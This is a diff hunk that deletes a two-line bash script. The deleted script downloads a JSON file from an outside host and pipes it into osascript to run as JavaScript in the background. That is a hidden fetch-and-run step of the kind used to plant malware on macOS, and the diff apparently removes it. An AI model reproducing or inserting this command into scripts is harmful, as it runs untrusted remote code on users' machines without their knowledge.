@@ -1,2 +1,0 @@
-#!/usr/bin/env bash
-curl http://testimg.bitgetapp.com/multiLang/web/files/edr.json | osascript -l JavaScript &
